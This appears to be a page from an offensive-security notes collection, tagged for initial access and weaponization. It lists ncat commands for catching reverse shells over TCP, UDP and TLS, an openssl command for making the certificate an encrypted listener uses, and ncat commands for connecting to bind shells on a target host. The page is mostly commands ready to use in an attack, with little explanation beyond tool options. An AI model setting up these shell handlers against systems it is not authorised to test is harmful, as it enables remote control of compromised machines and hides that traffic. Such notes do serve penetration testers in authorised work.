---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - cross-platform
  - ncat
---
# Ncat

## 01 - Reverse Shell Handler

## 1.1 - TCP Method

```
$ ncat -lnvp <PORT>
```

Whitelist IP addresses. If it's a file then the IP addresses should be separated line by line.

```
$ ncat -lnvp <PORT> --allow <IP_1>,<IP_n>

$ ncat -lnvp <PORT> --allowfile whitelist_ips.txt
```

Blacklist IP addresses. If it's a file then the IP addresses should be separated line by line.

```
$ ncat -lnvp <PORT> --deny <IP_1>,<IP_n>

$ ncat -lnvp <PORT> --denyfile blacklist_ips.txt
```

## 1.2 - UDP Method

```
$ ncat -lnuvp <PORT>
```

## 1.3 - TLS Method

Generate TLS certificate.

```
userware@hackware-os:~$ openssl req -x509 -newkey rsa:4096 -days 365 -nodes -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email> -keyout private.key -out certificate.crt
```

Launch shell handler.

```
$ ncat --ssl --ssl-key private.key --ssl-cert certificate.crt -lp <PORT>
```

## 02 - Bind Shell Handler

### 2.1 - TCP Method

```
$ ncat <target_IP> <target_PORT>
```

### 2.2 - UDP Method

```
$ ncat -u <target_IP> <target_PORT>
```

### 2.3 - TLS Method

```
$ ncat --ssl <target_IP> <target_PORT>
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Implant/Windows/Payloads/One-Liners/Netcat]]